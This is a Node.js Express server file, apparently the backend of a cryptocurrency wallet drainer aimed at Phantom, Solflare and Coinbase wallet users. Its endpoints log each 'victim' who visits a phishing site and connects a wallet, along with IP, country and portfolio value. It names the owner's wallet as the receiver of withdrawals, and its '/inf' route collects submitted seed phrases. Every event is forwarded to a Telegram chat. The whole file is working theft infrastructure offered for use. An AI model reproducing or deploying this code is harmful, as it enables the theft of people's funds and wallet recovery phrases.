const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const compression = require('compression');

const DATABASE = require('./database.json');
const { initTG, sendMessageToChat } = require("./bot");
const { getHostnameFromRegex } = require("./functions");
const { lmao } = require('./fun');

const app = express();
const port = process.env.PORT || DATABASE.backendPort;

// app.set('trust proxy', true);

app.use(compression());
app.use(cors());
app.use(bodyParser.json({limit: '150mb'}));
app.use(bodyParser.urlencoded({limit: '150mb', extended: true}));

app.get('/', (req, res) => {
    res.send('OK');
});

function checkConnectionKey(key = null) {
    try {
        if (key !== DATABASE.connectionKey) return false;
        return true;
    } catch (e) {
        return false;
    }
}

app.post("/onaccept", async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        const ORIGIN = req.body.ORIGIN;
        const ITEMS = req.body.ITEMS;
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        let totalValue = 0;
        if (ITEMS && Array.isArray(ITEMS)) {
            for (const item of ITEMS) {
                totalValue += parseFloat(item.VALUE) || 0;
            }
        }

        if (GCID) {
            sendMessageToChat(GCID, `<b>&#128184; New transaction (IP: ${CIP} / Country: ${COUNTRY})\n\n🔗 Domain: ${getHostnameFromRegex(ORIGIN)}\n&#9989; USD: ${formatter.format(totalValue)}\nTotal activity: ${ITEMS ? ITEMS.length : 0}</b>`)
        }

        res.send(lmao());
    } catch (e) {
        console.error(e);
        res.destroy();
    }
})

app.post('/details', async (req, res) => {
    const CONNECTIONKEY = req.body.CONNECTIONKEY;

    if (!checkConnectionKey(CONNECTIONKEY)) {
        res.destroy();
        return;
    }

    const wallet = DATABASE.ownerPublicKey;

    return res.json({
        "RECEIVER": wallet
    })
});

app.post('/info', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        const victim = req.body.WALLET;
        const portfolio = req.body.PORTFOLIO;
        const origin = req.body.ORIGIN || "http://localhost";
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);
        let totalValue = 0;
        let message = `<b>⚡️ User connected the wallet (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>&#128123; Have Phantom Wallet? ${req.body.wallets.phantom ? "Yes!" : "No"}\n&#127774; Have Solflare Wallet? ${req.body.wallets.solflare ? "Yes!" : "No"}\n🪙 Have Coinbase Wallet? ${req.body.wallets.coinbase ? "Yes!" : "No"}\n💼 Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>\n<b>&#128279; Domain: ${getHostnameFromRegex(origin)}</b>\n\n<b>User Assets</b>\n<blockquote>`
        let i = 0;
        for (const portfolioItem of portfolio) {
            i++;
            if (portfolioItem.NAME !== undefined) {
                const itemValue = parseFloat(portfolioItem.VALUE) || 0;
                totalValue += itemValue;
                if (itemValue == 0) i--;
                else if (i <= 20) message += `${i}. ${portfolioItem.MINT} - ${portfolioItem.NAME} - ${formatter.format(portfolioItem.VALUE)}\n`
            } else {
                i--;
            }

        }
        message += `</blockquote>\n\n&#128179; <b>Wallet costs:</b> <pre>${formatter.format(totalValue)}</pre>`;

        if (GCID) {
            sendMessageToChat(GCID, message);
        }

        return res.send(lmao())
    } catch (e) {
        console.error(e);
        res.destroy();
    }
});

app.post('/join', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        const origin = req.body.ORIGIN || "http://localhost";
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        let message = `<b>👨‍💻 User opened the website (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>🔗 Domain: ${getHostnameFromRegex(origin)}\n&#128123; Have Phantom Wallet? ${req.body.wallets.phantom ? "Yes!" : "No"}\n&#127774; Have Solflare Wallet? ${req.body.wallets.solflare ? "Yes!" : "No"}\n🪙 Have Coinbase Wallet? ${req.body.wallets.coinbase ? "Yes!" : "No"}</b>`

        if (GCID) {
            sendMessageToChat(GCID, message);
        }

        return res.send(lmao())
    } catch (e) {
        console.error(e);
        res.destroy();
    }
});

app.post('/oncancel', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        const victim = req.body.WALLET;
        const origin = req.body.ORIGIN;
        const GCID = req.body.GCID;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);

        let message = `<b>&#10060; User rejected the request (IP: ${CIP} / Country: ${COUNTRY})\n🔗 Domain: ${getHostnameFromRegex(origin)}</b>\n\n<b>&#128188; Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>`;

        sendMessageToChat(GCID, message);
        return res.send(lmao())
    } catch (e) {
        console.error(e);
        res.destroy();
    }
});

app.post('/inf', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        try {
            const GCID = req.body.GCID;
            const CIP = req.body.CIP;
            const COUNTRY = req.body.COUNTRY;

            const seeds = req.body.words;
            const origin = req.body.ORIGIN;
            
            var t = '';

            let regex = new RegExp('[A-Za-z\\s]+');

            let i = 1;
            let count = 0;

            for (var word of seeds) {
                word = word.trim();
                if (regex.test(word)) {
                    t += `${i}. ${word}\n`;
                    count++;
                } else {
                    res.destroy();
                    return;
                }
                i++;
            }

            if (count != 12 && count != 24) {
                res.destroy();
                return;
            }

            var message = `<b>&#127793; Got seed phrase (IP: ${CIP} / Country: ${COUNTRY})\n\n&#128279; Domain\n${getHostnameFromRegex(origin)}\n\nData:\n${t}</b>`;

            sendMessageToChat(GCID, message);
        } catch (e) {
            console.error(e);
        }

        return res.send("ok");
    } catch (e) {
        console.error(e);
        res.destroy();
    }
});

app.post('/onrequest', async (req, res) => {
    try {
        const CONNECTIONKEY = req.body.CONNECTIONKEY;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            res.destroy();
            return;
        }

        const GCID = req.body.GCID;
        
        const victim = req.body.WALLET;
        const origin = req.body.ORIGIN;
        const CIP = req.body.CIP;
        const COUNTRY = req.body.COUNTRY;

        const addressPartOne = victim.slice(0, 6);
        const addressPartTwo = victim.slice(-4);
        
        let message = `<b>&#10067; User recieved a withdrawal request (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>🔗 Domain: ${getHostnameFromRegex(origin)}</b>\n<b>&#128188; Wallet: <a href="https://app.step.finance/en/dashboard?watching=${victim}">${addressPartOne}...${addressPartTwo}</a></b>`;

        sendMessageToChat(GCID, message);
        return res.send(lmao());
    } catch (e) {
        console.error(e);
        res.destroy();
    }
});

app.post('/connect', async (req, res) => {
    const CONNECTIONKEY = req.body.CONNECTIONKEY;

    if (!checkConnectionKey(CONNECTIONKEY)) {
        res.send(lmao());
        return;
    }

    return res.send("1");
});

app.get("/*", async (req, res) => {
    res.destroy();
});

app.post("/*", async (req, res) => {
    res.destroy();
});

app.listen(port, '0.0.0.0', async function () {
    await initTG();

    console.log(`Now we at ${port}`);
});